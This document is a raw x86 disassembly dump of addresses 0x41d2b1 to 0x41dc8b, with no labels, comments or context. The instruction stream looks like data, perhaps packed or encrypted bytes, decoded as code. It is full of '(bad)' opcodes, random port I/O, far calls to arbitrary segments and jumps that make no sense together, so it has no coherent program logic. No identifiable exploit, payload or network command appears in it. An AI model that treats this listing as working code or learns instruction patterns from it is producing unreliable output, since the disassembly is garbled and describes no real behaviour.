  41d2b1:	sbb    DWORD PTR [ebx-0x31c00527],edx
  41d2b7:	out    dx,eax
  41d2b8:	ja     0x41d2ef
  41d2ba:	repz push 0xfffffff9
  41d2bd:	fnsave [esi+ebx*2]
  41d2c0:	fldl2e 
  41d2c2:	adc    DWORD PTR [eax-0x12e9b675],eax
  41d2c8:	fld    QWORD PTR [edi]
  41d2ca:	and    DWORD PTR [edx+eax*2],0x5c
  41d2ce:	push   ecx
  41d2cf:	sbb    al,BYTE PTR [esi]
  41d2d1:	in     eax,dx
  41d2d2:	neg    DWORD PTR [edx+0x1f]
  41d2d5:	mul    DWORD PTR [eax]
  41d2d7:	cs test al,0x60
  41d2da:	outs   dx,BYTE PTR ds:[esi]
  41d2db:	(bad)  
  41d2dc:	mov    ebx,0xd2a364b8
  41d2e1:	dec    ebx
  41d2e2:	jg     0x41d2ea
  41d2e4:	xchg   edx,eax
  41d2e5:	and    al,0xeb
  41d2e7:	cs scas eax,DWORD PTR es:[edi]
  41d2e9:	mov    ebp,ecx
  41d2eb:	repnz addr16 mov ebx,0x3bc883a
  41d2f2:	ss mov al,0x18
  41d2f5:	push   esi
  41d2f6:	xor    eax,0xa22cdecc
  41d2fb:	pop    esi
  41d2fc:	in     al,dx
  41d2fd:	enter  0xe9b9,0x39
  41d301:	cld    
  41d302:	cmp    eax,0xcf963ff
  41d307:	add    BYTE PTR [eax],bl
  41d309:	into   
  41d30a:	mov    ebx,0xd6880950
  41d30f:	aad    0x0
	...
  41d371:	add    BYTE PTR [eax],al
  41d373:	add    dh,bh
  41d375:	cmp    cl,0x54
  41d378:	(bad)  
  41d379:	jge    0x41d37a
  41d37b:	stos   BYTE PTR es:[edi],al
  41d37c:	lea    ebp,[edi]
  41d37e:	shr    BYTE PTR [ecx-0x70],0xdb
  41d382:	sti    
  41d383:	scas   al,BYTE PTR es:[edi]
  41d384:	push   0x4000136
  41d389:	add    DWORD PTR [eax],eax
  41d38b:	add    BYTE PTR [ecx+0x4396b5b2],ah
  41d391:	push   edx
  41d392:	mov    ch,0x93
  41d394:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d395:	lock int 0x53
  41d398:	aas    
  41d399:	add    BYTE PTR [esi-0x22],cl
  41d39c:	adc    ch,BYTE PTR [ebp+eax*8+0x56]
  41d3a0:	cmp    DWORD PTR [edx],ebx
  41d3a2:	mov    ds:0x511c7d8b,eax
  41d3a7:	imul   edx,esp,0xfffffff2
  41d3aa:	rol    BYTE PTR [edx+0x60c87e74],cl
  41d3b0:	jno    0x41d3d0
  41d3b2:	and    al,0x97
  41d3b4:	outs   dx,BYTE PTR ds:[esi]
  41d3b6:	jmp    0x41d419
  41d3b8:	or     dl,BYTE PTR [eax+0x36]
  41d3bb:	mov    bl,0x54
  41d3bd:	test   eax,0x4a3737f6
  41d3c2:	and    eax,DWORD PTR [ecx]
  41d3c4:	push   ebx
  41d3c5:	ins    DWORD PTR es:[edi],dx
  41d3c6:	lea    eax,[esi+0x2c]
  41d3c9:	jl     0x41d42e
  41d3cb:	cmc    
  41d3cc:	xchg   edx,eax
  41d3cd:	mov    cs,WORD PTR [eax-0xb0bf906]
  41d3d3:	sub    ebx,esp
  41d3d5:	add    DWORD PTR [esi],esp
  41d3d7:	out    0x7,eax
  41d3d9:	fldcw  WORD PTR [ecx-0x79]
  41d3dc:	or     eax,0x5fe71d17
  41d3e1:	jno    0x41d3f4
  41d3e3:	in     al,dx
  41d3e4:	push   es
  41d3e5:	push   ebp
  41d3e6:	int3   
  41d3e7:	ror    eax,1
  41d3e9:	and    eax,0xcc37769a
  41d3ee:	clc    
  41d3ef:	imul   edi,DWORD PTR [ebp-0x62],0xffffffff
  41d3f3:	add    al,0x43
  41d3f5:	in     eax,dx
  41d3f6:	out    dx,al
  41d3f7:	jbe    0x41d471
  41d3f9:	inc    ebx
  41d3fa:	mov    esp,0x222e2c45
  41d3ff:	push   ss
  41d400:	fbld   TBYTE PTR [esi]
  41d402:	retf   0xb621
  41d405:	mov    bl,0xd1
  41d407:	mov    edx,0xc7c93a6f
  41d40c:	mov    BYTE PTR [edx+0x3d],0xa4
  41d410:	out    0xd6,al
  41d412:	adc    DWORD PTR [edi],esp
  41d414:	or     BYTE PTR [ebx],0x9a
  41d417:	add    al,0x56
  41d419:	gs push ebp
  41d41b:	jns    0x41d492
  41d41d:	push   cs
  41d41e:	pop    edi
  41d41f:	inc    eax
  41d420:	fcomp  QWORD PTR ds:0xfaf12824
  41d426:	adc    al,0xce
  41d428:	pusha  
  41d429:	jmp    0x41d484
  41d42b:	add    al,0xc9
  41d42d:	fidivr WORD PTR [edi+0x70b9791d]
  41d433:	cld    
  41d434:	push   es
  41d435:	std    
  41d436:	aam    0xa1
  41d438:	std    
  41d439:	xor    DWORD PTR [ebp-0x33],edx
  41d43c:	daa    
  41d43d:	js     0x41d3e5
  41d43f:	mov    ebx,0xb2bc512d
  41d444:	loop   0x41d424
  41d446:	and    ch,BYTE PTR [edi]
  41d448:	fs dec ebx
  41d44a:	(bad)  
  41d44b:	push   ebx
  41d44c:	adc    edi,ecx
  41d44e:	and    al,0x93
  41d450:	ja     0x41d3dc
  41d452:	pop    esi
  41d453:	mov    edx,DWORD PTR [edi+0x6c]
  41d456:	mov    bl,0x71
  41d458:	popf   
  41d459:	cli    
  41d45a:	rol    BYTE PTR [ebx-0x6b],1
  41d45d:	sub    eax,0x4c1d49b9
  41d462:	push   edx
  41d463:	xchg   esi,eax
  41d464:	ficomp WORD PTR [ecx+0x20e0f5eb]
  41d46a:	gs jmp 0xfb42:0xe0161932
  41d472:	fdiv   QWORD PTR [ebx+0x4e7653ad]
  41d478:	adc    DWORD PTR ds:0x9ec34cc7,eax
  41d47e:	and    al,0xdd
  41d480:	and    eax,0x199974bf
  41d485:	sub    BYTE PTR [edx+0x10d4b8c0],dl
  41d48b:	mov    al,ds:0x2c4e6d81
	...
  41d4f4:	div    BYTE PTR [esi]
  41d4f6:	rcl    BYTE PTR [edx+edx*8+0x7d76f6f4],cl
  41d4fd:	nop
  41d4fe:	call   0x6cd4:0x27d3ec89
  41d505:	aaa    
  41d506:	add    DWORD PTR [eax],eax
  41d508:	add    al,0x1
  41d50a:	add    BYTE PTR [eax],al
  41d50c:	loopne 0x41d549
  41d50e:	push   0xffffff91
  41d510:	xlat   BYTE PTR ds:[ebx]
  41d511:	pop    ebp
  41d512:	pop    ss
  41d513:	cwde   
  41d514:	pop    ds
  41d515:	push   0x1d
  41d517:	sub    al,0x6
  41d519:	ins    BYTE PTR es:[edi],dx
  41d51a:	jg     0x41d51e
  41d51c:	and    DWORD PTR [ebp+0x65],0xeb2940f9
  41d523:	mov    WORD PTR [ebp+0x1a],?
  41d526:	fwait
  41d527:	mov    bl,0xe7
  41d529:	push   0x67
  41d52b:	add    DWORD PTR [edx+0x35c9c152],edx
  41d531:	cmc    
  41d532:	inc    esp
  41d533:	lods   eax,DWORD PTR ds:[esi]
  41d534:	inc    BYTE PTR [eax]
  41d536:	js     0x41d4cc
  41d538:	jp     0x41d52c
  41d53a:	push   ecx
  41d53b:	sub    eax,0x6a9eea38
  41d540:	push   ds
  41d541:	cmp    bl,al
  41d543:	clc    
  41d544:	outs   dx,BYTE PTR ds:[esi]
  41d545:	dec    ebp
  41d546:	js     0x41d5b6
  41d548:	popf   
  41d549:	arpl   dx,cx
  41d54b:	pusha  
  41d54c:	xor    esi,eax
  41d54e:	sub    bh,cl
  41d550:	pop    eax
  41d551:	sti    
  41d552:	test   DWORD PTR [ecx-0x3263860f],esp
  41d558:	adc    eax,0xd560c733
  41d55d:	push   ebp
  41d55e:	or     dh,dl
  41d560:	icebp  
  41d561:	iret   
  41d562:	aad    0xe5
  41d564:	pop    ds
  41d565:	adc    BYTE PTR [ebx],0xfd
  41d568:	test   DWORD PTR [ebx],edx
  41d56a:	push   edx
  41d56b:	out    0x8a,eax
  41d56d:	mov    ah,0xe1
  41d56f:	lds    esp,FWORD PTR [edi+eax*8-0x333fdbfa]
  41d576:	jmp    0x41d52d
  41d578:	add    cl,BYTE PTR [ebx]
  41d57a:	xchg   edx,eax
  41d57b:	dec    eax
  41d57c:	sar    BYTE PTR [ecx+0x16f80421],1
  41d582:	jns    0x41d5f6
  41d584:	mov    WORD PTR [edx+0x3569e083],cs
  41d58a:	xor    BYTE PTR [ebp+0x236e36cf],ah
  41d590:	jl     0x41d603
  41d592:	daa    
  41d593:	loope  0x41d524
  41d595:	adc    BYTE PTR [ebx-0x12],dh
  41d598:	dec    eax
  41d599:	ins    BYTE PTR es:[edi],dx
  41d59a:	adc    al,0xe1
  41d59c:	scas   eax,DWORD PTR es:[edi]
  41d59d:	(bad)  
  41d59e:	test   al,0x41
  41d5a0:	xlat   BYTE PTR ds:[ebx]
  41d5a1:	dec    eax
  41d5a2:	or     eax,0x27eb64e5
  41d5a7:	xlat   BYTE PTR ds:[ebx]
  41d5a8:	push   es
  41d5a9:	loopne 0x41d5cb
  41d5ab:	inc    edi
  41d5ac:	mov    ds:0x1680d808,eax
  41d5b1:	push   ecx
  41d5b2:	adc    dh,ch
  41d5b4:	mulps  xmm4,XMMWORD PTR [edx-0x7439c6b0]
  41d5bb:	mov    ebx,0x59095725
  41d5c0:	(bad)  
  41d5c1:	into   
  41d5c2:	fcmovb st,st(1)
  41d5c4:	mov    esi,0x9caa465
  41d5c9:	push   ebx
  41d5ca:	sub    al,0x7f
  41d5cc:	xchg   ebx,eax
  41d5cd:	call   0x3a4e:0x9adc7751
  41d5d4:	sbb    al,0x3b
  41d5d6:	int    0x66
  41d5d8:	xchg   ebx,eax
  41d5d9:	adc    edi,DWORD PTR [bp+di]
  41d5dc:	pop    esp
  41d5dd:	xchg   ecx,eax
  41d5de:	sub    DWORD PTR [ebx+0x6f],0xbec21f45
  41d5e5:	data16 mul BYTE PTR [ebx-0x750e4c23]
  41d5ec:	sbb    DWORD PTR [ebx-0x6a],0xffffff80
  41d5f0:	jmp    FWORD PTR [eax+0x79]
  41d5f3:	(bad)  
  41d5f4:	mov    ah,0xa6
  41d5f6:	dec    ebp
  41d5f7:	sub    al,0x1c
  41d5f9:	cdq    
  41d5fa:	mov    al,ds:0x6d43ef26
  41d5ff:	js     0x41d645
  41d601:	or     DWORD PTR ds:0x9fdf84ed,edx
  41d607:	test   al,0x12
  41d609:	mov    ch,0xac
  41d60b:	gs xchg ebx,eax
  41d60d:	pop    ebx
  41d60e:	xchg   ecx,eax
  41d60f:	push   0x0
	...
  41d674:	jl     0x41d60f
  41d676:	dec    esp
  41d677:	jbe    0x41d666
  41d679:	idiv   DWORD PTR [esi-0x65]
  41d67c:	or     eax,0xdb66e435
  41d681:	push   eax
  41d682:	push   0x2b
  41d684:	jo     0x41d6be
  41d686:	add    DWORD PTR [eax],eax
  41d688:	add    al,0x1
  41d68a:	add    BYTE PTR [eax],al
  41d68c:	sbb    esi,DWORD PTR [edi+0x56]
  41d68f:	push   esp
  41d690:	pop    esp
  41d691:	cmc    
  41d692:	es neg ebp
  41d695:	test   eax,0x86e4d7ea
  41d69a:	add    ch,0x1d
  41d69d:	inc    ebx
  41d69e:	or     eax,0x41f5f746
  41d6a3:	int    0xa2
  41d6a5:	mov    ds:0x7ad52cf8,al
  41d6aa:	add    BYTE PTR [ebp+0x5b897c75],0x15
  41d6b1:	cli    
  41d6b2:	xchg   ebp,eax
  41d6b3:	pop    ebx
  41d6b4:	rcr    DWORD PTR [di],cl
  41d6b7:	pop    es
  41d6b8:	mov    ds:0x40a52bbf,eax
  41d6bd:	hlt    
  41d6be:	mov    bl,BYTE PTR [ebx]
  41d6c0:	arpl   dx,si
  41d6c2:	jmp    0x41d675
  41d6c4:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  41d6c6:	loopne 0x41d738
  41d6c8:	sbb    al,BYTE PTR [ecx-0x37]
  41d6cb:	xchg   edi,eax
  41d6cc:	daa    
  41d6cd:	jge    0x41d6f1
  41d6cf:	or     BYTE PTR [ebx+edi*8],al
  41d6d2:	sbb    eax,0xffffffc4
  41d6d5:	out    0x95,eax
  41d6d7:	and    dl,dl
  41d6d9:	xchg   DWORD PTR [edx-0x795fbc06],ebp
  41d6df:	shl    BYTE PTR [edi-0x3f],1
  41d6e2:	xchg   ah,bh
  41d6e4:	sahf   
  41d6e5:	gs sahf 
  41d6e7:	fwait
  41d6e8:	pop    esi
  41d6e9:	push   esi
  41d6ea:	pop    es
  41d6eb:	(bad)  
  41d6ec:	(bad)  [esi-0x25a807e1]
  41d6f2:	inc    ebx
  41d6f3:	pushf  
  41d6f4:	ins    BYTE PTR es:[edi],dx
  41d6f5:	jmp    0x41d775
  41d6f7:	leave  
  41d6f8:	inc    edx
  41d6f9:	add    BYTE PTR [ebp+0x23],cl
  41d6fc:	add    bh,ch
  41d6fe:	popf   
  41d6ff:	or     al,0x87
  41d701:	cmp    ebp,DWORD PTR [edi-0x5f]
  41d704:	sub    al,0xdb
  41d706:	(bad)  
  41d707:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d708:	and    BYTE PTR [ebx+0x5c],ah
  41d70b:	mov    ebx,0xce3740a9
  41d710:	ss dec ebx
  41d712:	pop    esp
  41d714:	rcr    DWORD PTR [ebp-0x3a],1
  41d717:	xchg   ebp,eax
  41d718:	push   ebp
  41d719:	jg     0x41d6cd
  41d71b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d71c:	in     eax,dx
  41d71d:	push   edx
  41d71e:	les    esp,FWORD PTR [edx]
  41d720:	mov    ds:0x2982b7fc,eax
  41d725:	jae    0x41d73a
  41d727:	push   eax
  41d728:	jno    0x41d747
  41d72a:	xor    eax,0x3172ea3d
  41d72f:	retf   0x6942
  41d732:	xor    eax,0x7b0775c3
  41d737:	push   edx
  41d738:	enter  0x4711,0xef
  41d73c:	aas    
  41d73d:	mov    DWORD PTR [bx+si],edx
  41d740:	inc    eax
  41d741:	jg     0x41d711
  41d743:	nop
  41d744:	pop    ebp
  41d745:	or     al,ch
  41d747:	daa    
  41d748:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d749:	dec    eax
  41d74a:	nop
  41d74b:	add    dl,BYTE PTR ds:0xf16e93a8
  41d751:	addr16 or eax,0x12f6817e
  41d757:	pop    eax
  41d758:	call   0x63468d9b
  41d75d:	add    al,0x3f
  41d75f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d760:	call   0x777d:0x4cbfdfee
  41d767:	shl    BYTE PTR [eax],cl
  41d769:	push   es
  41d76a:	je     0x41d728
  41d76c:	mov    ds:0x41ab4333,al
  41d771:	imul   ebp,DWORD PTR [ebp+0xb],0x54
  41d775:	and    bl,ah
  41d777:	add    eax,0xfca79c9d
  41d77c:	xor    esp,DWORD PTR [ebx]
  41d77e:	xchg   esp,eax
  41d77f:	(bad)  
  41d780:	push   eax
  41d781:	adc    ch,BYTE PTR [ebp-0x65]
  41d784:	adc    al,0x0
  41d786:	xor    eax,ebx
  41d788:	(bad)  
  41d789:	pop    esi
  41d78a:	add    al,0x19
  41d78c:	cmp    ebx,edx
  41d78e:	xchg   ebx,ecx
	...
  41d7f4:	and    al,0xce
  41d7f6:	outs   dx,BYTE PTR ds:[esi]
  41d7f7:	sub    ch,dh
  41d7f9:	stos   BYTE PTR es:[edi],al
  41d7fa:	fs into 
  41d7fc:	jmp    0x41d789
  41d7fe:	leave  
  41d7ff:	aas    
  41d800:	sub    al,0x48
  41d802:	les    ebp,FWORD PTR [edx+0x13974]
  41d808:	add    al,0x1
  41d80a:	add    BYTE PTR [eax],al
  41d80c:	ss push edi
  41d80e:	or     cl,bh
  41d810:	ror    DWORD PTR [esi],1
  41d812:	sar    esp,cl
  41d814:	(bad)  
  41d815:	jno    0x41d7d7
  41d817:	test   BYTE PTR [edi+0x35e0b99b],0xca
  41d81e:	sbb    al,bh
  41d820:	xchg   dh,dh
  41d822:	stc    
  41d823:	or     BYTE PTR [ebp+0x50],al
  41d826:	cmp    eax,0x592db47b
  41d82b:	shl    ecx,1
  41d82d:	cld    
  41d82e:	xchg   ecx,eax
  41d82f:	sub    DWORD PTR [edx],ebx
  41d831:	mov    ecx,ebp
  41d833:	stos   BYTE PTR es:[edi],al
  41d834:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d835:	push   esi
  41d836:	pop    eax
  41d837:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d838:	cld    
  41d839:	aas    
  41d83a:	aas    
  41d83b:	popf   
  41d83c:	pop    ebp
  41d83d:	adc    dl,BYTE PTR [edi-0x37]
  41d840:	inc    eax
  41d841:	les    eax,FWORD PTR [ebx+0x4b]
  41d844:	out    dx,eax
  41d845:	pop    esi
  41d846:	out    0x7b,eax
  41d848:	jmp    0xb2fa59fd
  41d84d:	cli    
  41d84e:	mov    ecx,ebp
  41d850:	scas   eax,DWORD PTR es:[edi]
  41d851:	pop    ss
  41d852:	sbb    al,BYTE PTR [esi+0x6b1c1730]
  41d858:	jl     0x41d7e0
  41d85a:	dec    ebp
  41d85b:	scas   al,BYTE PTR es:[edi]
  41d85c:	inc    esp
  41d85d:	test   DWORD PTR [esi+0x2d6d99e8],ebp
  41d863:	mov    BYTE PTR [ecx*1+0x4ce2767c],bh
  41d86a:	adc    eax,0x68e621df
  41d86f:	mov    esp,gs
  41d871:	lods   eax,DWORD PTR ds:[esi]
  41d872:	adc    bh,bl
  41d874:	(bad)  
  41d875:	jp     0x41d867
  41d877:	test   eax,0x310d816d
  41d87c:	loope  0x41d8bd
  41d87e:	sub    BYTE PTR [edx],0x3
  41d881:	mov    al,0x46
  41d883:	dec    ebp
  41d884:	ds or  DWORD PTR es:[ebp-0x5cc1f09b],0x18a38cf7
  41d890:	mov    ch,0x63
  41d892:	or     edi,DWORD PTR [esi-0x1f]
  41d895:	retf   0xeac4
  41d898:	outs   dx,BYTE PTR ds:[esi]
  41d899:	cs inc al
  41d89c:	pop    ss
  41d89d:	sahf   
  41d89e:	lds    esp,FWORD PTR [eax+0x5b]
  41d8a1:	adc    BYTE PTR [esp+ebp*8],ch
  41d8a4:	inc    ecx
  41d8a5:	mov    ah,0x86
  41d8a7:	mov    dl,0x2
  41d8a9:	xchg   edx,eax
  41d8aa:	mov    al,0x97
  41d8ac:	dec    edx
  41d8ad:	inc    esi
  41d8ae:	stc    
  41d8af:	shr    BYTE PTR [ebx],cl
  41d8b1:	ins    BYTE PTR es:[edi],dx
  41d8b2:	sbb    ah,BYTE PTR ds:0x1a45ad56
  41d8b8:	mov    eax,ds:0xea8f8a2e
  41d8bd:	daa    
  41d8be:	(bad)  
  41d8bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d8c0:	test   BYTE PTR [ecx+eax*8-0x1b],cl
  41d8c4:	icebp  
  41d8c5:	sbb    ecx,esp
  41d8c7:	mov    dh,0x93
  41d8c9:	in     eax,0xdf
  41d8cb:	shl    DWORD PTR [edi],0x4d
  41d8ce:	dec    edx
  41d8cf:	sti    
  41d8d0:	mov    WORD PTR [edx+0x6feef83b],ss
  41d8d6:	xor    al,0x7a
  41d8d8:	test   BYTE PTR [ebx-0x3c],0xe3
  41d8dc:	lea    ebp,[esp+esi*2-0x6]
  41d8e0:	fwait
  41d8e1:	push   edx
  41d8e2:	test   eax,0xcd0cfbad
  41d8e7:	or     dh,dh
  41d8e9:	fs inc esi
  41d8eb:	jnp    0x41d8aa
  41d8ed:	push   ds
  41d8ee:	xor    al,0x18
  41d8f0:	inc    ebp
  41d8f1:	test   ah,dh
  41d8f3:	call   0xf42022e4
  41d8f8:	rcr    BYTE PTR [ecx+0x19],0x46
  41d8fc:	aad    0x6d
  41d8fe:	nop
  41d8ff:	stc    
  41d900:	inc    eax
  41d901:	sahf   
  41d902:	retf   
  41d903:	xchg   esi,eax
  41d904:	stos   BYTE PTR es:[edi],al
  41d905:	imul   esi,edi,0xdd01d4c0
  41d90b:	jecxz  0x41d8d4
  41d90d:	or     BYTE PTR [eax+0x4a],bl
	...
  41d974:	les    ebp,FWORD PTR [edi+eax*1-0x64]
  41d978:	scas   eax,DWORD PTR es:[edi]
  41d979:	(bad)  
  41d97a:	fistp  QWORD PTR [esp+ebx*8-0x4e]
  41d97e:	outs   dx,DWORD PTR ds:[esi]
  41d97f:	gs test al,0x37
  41d982:	mov    WORD PTR [ebx],ss
  41d984:	js     0x41d9c0
  41d986:	add    DWORD PTR [eax],eax
  41d988:	add    al,0x1
  41d98a:	add    BYTE PTR [eax],al
  41d98c:	outs   dx,DWORD PTR ds:[esi]
  41d98d:	retf   0x4281
  41d990:	(bad)  
  41d991:	sahf   
  41d992:	pop    ebx
  41d993:	std    
  41d994:	scas   eax,DWORD PTR es:[edi]
  41d995:	push   ebp
  41d996:	in     al,dx
  41d997:	push   cs
  41d998:	xlat   BYTE PTR ds:[ebx]
  41d999:	enter  0xff68,0x23
  41d99d:	push   esp
  41d99e:	xchg   edi,eax
  41d99f:	fstp   DWORD PTR [ecx-0x3]
  41d9a2:	je     0x41d9bb
  41d9a4:	push   ss
  41d9a5:	std    
  41d9a6:	scas   al,BYTE PTR es:[edi]
  41d9a7:	int    0xce
  41d9a9:	or     eax,0xa1c9ce70
  41d9ae:	sub    eax,0xdba417de
  41d9b3:	out    dx,al
  41d9b4:	mov    ds:0x77c0a27a,eax
  41d9b9:	and    cl,al
  41d9bb:	div    BYTE PTR [ebp-0x2b9428d0]
  41d9c1:	fwait
  41d9c2:	cli    
  41d9c3:	mov    dl,0x57
  41d9c5:	dec    esi
  41d9c6:	mov    ds:0x9b9279bc,al
  41d9cb:	fidiv  WORD PTR [ebp+0x7b3b8a43]
  41d9d1:	mov    ah,0x30
  41d9d3:	cmp    BYTE PTR [esi],al
  41d9d5:	cmp    DWORD PTR ds:0x7b473044,ebp
  41d9db:	aaa    
  41d9dc:	arpl   sp,bp
  41d9de:	retf   0xd0bc
  41d9e1:	loop   0x41d9b4
  41d9e3:	imul   ecx,DWORD PTR [ebx-0x5ddcdf1a],0xffffffab
  41d9ea:	repz inc ah
  41d9ed:	pop    eax
  41d9ee:	popa   
  41d9ef:	leave  
  41d9f0:	push   esp
  41d9f1:	sti    
  41d9f2:	gs dec eax
  41d9f4:	data16 ror dl,0x1c
  41d9f8:	sti    
  41d9f9:	xchg   bl,cl
  41d9fb:	jl     0x41d9d1
  41d9fd:	sub    ah,BYTE PTR [eax+0x3d]
  41da00:	push   0xffffffbe
  41da02:	daa    
  41da03:	out    0x24,al
  41da05:	and    bh,al
  41da07:	(bad)  
  41da08:	(bad)  
  41da09:	lods   eax,DWORD PTR ds:[esi]
  41da0a:	test   DWORD PTR [ebx],esp
  41da0c:	test   DWORD PTR [ebp+ebx*4-0x10],esp
  41da10:	nop
  41da11:	test   al,0x54
  41da13:	cmp    BYTE PTR [ecx-0x472dbe54],bh
  41da19:	sub    edx,ecx
  41da1b:	outs   dx,DWORD PTR ds:[esi]
  41da1c:	aam    0xb6
  41da1e:	ret    0xf665
  41da21:	hlt    
  41da22:	and    BYTE PTR [edx+0x6e89d44c],ch
  41da28:	test   DWORD PTR [edi+edx*4+0x64],esi
  41da2c:	xchg   esi,eax
  41da2d:	jecxz  0x41daa3
  41da2f:	je     0x41d9cd
  41da31:	xchg   edi,eax
  41da32:	push   cs
  41da33:	and    DWORD PTR [eax-0x5c],0xffffff83
  41da37:	ret    0x1bc1
  41da3a:	dec    ecx
  41da3b:	retf   0xcdd8
  41da3e:	and    edi,DWORD PTR [esi+eiz*4]
  41da41:	mov    dh,0xa3
  41da43:	push   0x47
  41da45:	pushf  
  41da46:	dec    esp
  41da47:	mov    ?,edx
  41da49:	add    BYTE PTR [ebp-0x783f7223],dh
  41da4f:	loop   0x41da57
  41da51:	sbb    BYTE PTR [ebp+edx*2-0x4],0x37
  41da56:	in     al,dx
  41da57:	mov    esi,0xfdf4273
  41da5c:	(bad)  
  41da5e:	mov    esi,0x64644f2a
  41da63:	bound  eax,QWORD PTR [ebp-0xc]
  41da66:	xchg   BYTE PTR [ebx*4+0x43c7806a],bl
  41da6d:	cmp    eax,0x5e9fca24
  41da72:	loopne 0x41da7f
  41da74:	loopne 0x41dab4
  41da76:	cs sbb ecx,esp
  41da79:	mov    ebx,?
  41da7b:	(bad)  
  41da7c:	loope  0x41da40
  41da7e:	ret    
  41da7f:	mov    ecx,0x9c0d1aff
  41da84:	lds    esp,FWORD PTR [esi+0x4ec63676]
  41da8a:	fidiv  DWORD PTR [eax+0x4]
  41da8d:	adc    al,ch
  41da8f:	xchg   ebp,eax
	...
  41daf4:	sbb    al,0x15
  41daf6:	jnp    0x41db4b
  41daf8:	jnp    0x41db79
  41dafa:	cmp    al,0x5f
  41dafc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dafd:	push   edi
  41dafe:	sbb    ebp,0xffffffb6
  41db01:	scas   eax,DWORD PTR es:[edi]
  41db02:	dec    edx
  41db03:	loopne 0x41db81
  41db05:	cmp    eax,DWORD PTR [ecx]
  41db07:	add    BYTE PTR [ecx+eax*1],al
  41db0a:	add    BYTE PTR [eax],al
  41db0c:	or     al,0xca
  41db0e:	mov    ebx,0x412e9d27
  41db13:	push   eax
  41db14:	inc    eax
  41db15:	enter  0x5e3a,0xf9
  41db19:	push   eax
  41db1a:	stos   DWORD PTR es:[edi],eax
  41db1b:	inc    esp
  41db1c:	and    DWORD PTR [eax],eax
  41db1e:	jne    0x41db84
  41db20:	pushf  
  41db21:	mov    ah,0xb5
  41db23:	adc    ch,bh
  41db25:	or     ecx,DWORD PTR ds:0xa3f862e6
  41db2b:	mov    ebp,0xd20d679f
  41db30:	jp     0x41db94
  41db32:	lods   eax,DWORD PTR ds:[esi]
  41db33:	(bad)  
  41db34:	jl     0x41db13
  41db36:	jno    0x41db01
  41db38:	ror    DWORD PTR [edx+0x4e1e0127],cl
  41db3e:	adc    BYTE PTR [ebp-0x6b],cl
  41db41:	push   bx
  41db43:	xchg   ebx,esi
  41db45:	sbb    ebp,DWORD PTR [eax+ebp*8]
  41db48:	nop
  41db49:	call   0x28dc:0xe021ea88
  41db50:	dec    edx
  41db51:	ret    0x6fbd
  41db54:	iret   
  41db55:	arpl   WORD PTR [ebp+0x1705bee0],sp
  41db5b:	test   eax,0x1651a75a
  41db60:	shl    edi,0xeb
  41db63:	xor    esi,DWORD PTR [ebx+0x2c]
  41db66:	pop    esi
  41db67:	mov    ds:0x27546b5a,al
  41db6c:	pop    ebp
  41db6d:	xor    BYTE PTR [ebx+eax*4],cl
  41db70:	inc    ebp
  41db71:	push   es
  41db72:	dec    esi
  41db73:	cmp    al,0xeb
  41db75:	icebp  
  41db76:	fstp   TBYTE PTR [ebp-0x38]
  41db79:	fmul   QWORD PTR [edx+0x48]
  41db7c:	out    0x96,eax
  41db7e:	jnp    0x41db6d
  41db80:	pop    ss
  41db81:	push   esp
  41db82:	xor    eax,0xfb94577c
  41db87:	jle    0x41db4d
  41db89:	xchg   edi,eax
  41db8a:	pop    edi
  41db8b:	call   0xed9c:0x4a85e979
  41db92:	fimul  DWORD PTR [edi+0x1da5da25]
  41db98:	and    dh,BYTE PTR [ecx]
  41db9a:	sbb    ecx,edx
  41db9c:	rcl    DWORD PTR [eax-0x2da2c579],1
  41dba2:	cmp    ah,BYTE PTR [ebx-0x18127b6f]
  41dba8:	push   eax
  41dba9:	or     al,BYTE PTR [edx]
  41dbab:	scas   al,BYTE PTR es:[edi]
  41dbac:	nop
  41dbad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dbae:	jne    0x41dc18
  41dbb0:	pushf  
  41dbb1:	dec    esi
  41dbb2:	das    
  41dbb3:	cmovne edx,DWORD PTR [ebp+0x3f]
  41dbb7:	into   
  41dbb8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dbb9:	test   DWORD PTR [edx-0x5c],edx
  41dbbc:	scas   al,BYTE PTR es:[edi]
  41dbbd:	xlat   BYTE PTR ds:[ebx]
  41dbbe:	fsub   DWORD PTR [ecx-0x109a7546]
  41dbc4:	pop    esi
  41dbc5:	mov    esi,0x61ba754e
  41dbca:	sub    bh,ah
  41dbcc:	add    dh,BYTE PTR [eax+0x28]
  41dbcf:	dec    edx
  41dbd0:	and    ch,BYTE PTR ds:0xb6f2bc4c
  41dbd6:	mov    ebp,0x8b6e8d50
  41dbdb:	add    DWORD PTR [ecx-0x5aaa0564],esi
  41dbe1:	sub    eax,edx
  41dbe3:	pop    edx
  41dbe4:	sti    
  41dbe5:	fwait
  41dbe6:	ret    
  41dbe7:	enter  0xd104,0xf5
  41dbeb:	stos   DWORD PTR es:[edi],eax
  41dbec:	loop   0x41dbb5
  41dbee:	stos   DWORD PTR es:[edi],eax
  41dbef:	dec    ebx
  41dbf0:	and    ah,BYTE PTR [edx+0x4e]
  41dbf3:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dbf5:	pop    ecx
  41dbf6:	sbb    bl,0x5
  41dbf9:	retf   
  41dbfa:	out    0x77,eax
  41dbfc:	sbb    dl,0xf2
  41dbff:	and    ecx,edi
  41dc01:	and    eax,0xb82c39dd
  41dc06:	add    ch,BYTE PTR [edx+0x1bd94432]
  41dc0c:	stc    
  41dc0d:	mov    bl,0xca
  41dc0f:	mov    edi,0x0
	...
  41dc74:	outs   dx,DWORD PTR ds:[esi]
  41dc75:	retf   0x9815
  41dc78:	mov    ch,0xdf
  41dc7a:	out    dx,eax
  41dc7b:	jmp    DWORD PTR [edi+0x28b0d050]
  41dc81:	adc    al,0xe1
  41dc83:	fiadd  DWORD PTR [eax+0x400013c]
  41dc89:	add    DWORD PTR [eax],eax
  41dc8b:	add    BYTE PTR [edi],ah
